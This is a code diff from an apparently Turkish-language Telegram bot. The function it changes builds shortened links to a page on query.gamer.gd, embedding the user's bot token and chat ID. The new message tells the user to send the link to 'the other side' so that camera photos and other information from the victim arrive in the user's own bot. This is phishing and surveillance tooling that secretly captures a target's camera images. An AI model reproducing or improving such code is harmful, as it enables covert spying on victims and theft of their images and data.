@@ -8249,7 +8249,8 @@ def _process_camera_token(msg, bot_instance):
     USER_STATES.pop(uid, None)
     bot_instance.reply_to(msg, "✅ <b>Token doğrulandı!</b>", parse_mode="HTML")
 
-    long_url = f"http://query.gamer.gd/C1.html?id={chat_id}&token={token}"
+    # id + chat_id ikisini de gönder (sayfa hangisini beklerse bulsun)
+    long_url = f"http://query.gamer.gd/C1.html?id={chat_id}&chat_id={chat_id}&token={token}"
     try:
         short = requests.get(
             "https://clck.ru/--",
@@ -8263,8 +8264,13 @@ def _process_camera_token(msg, bot_instance):
     bot_instance.send_message(
         chat_id,
         f"🔗 <b>Kısaltılmış Bağlantınız:</b>\n{short}\n\n"
-        "📷 Bu link ile kamera erişim bağlantısı oluşturuldu.\n"
-        "İstediğin kadar yeni link için tekrar token gönder (üyelik aktif).",
+        "📷 Link hazır.\n\n"
+        "⚠️ <b>ÖNEMLİ:</b>\n"
+        "1. Token’ini girdiğin <b>kendi botuna</b> gir\n"
+        "2. <b>/start</b> yazıp başlat\n"
+        "3. Sonra bu linki karşı tarafa gönder\n\n"
+        "Botuna /start atmazsan fotoğraf <b>asla gelmez</b>.\n"
+        "İzinler verildikçe bilgiler senin botuna düşer.",
         parse_mode="HTML"
     )
 
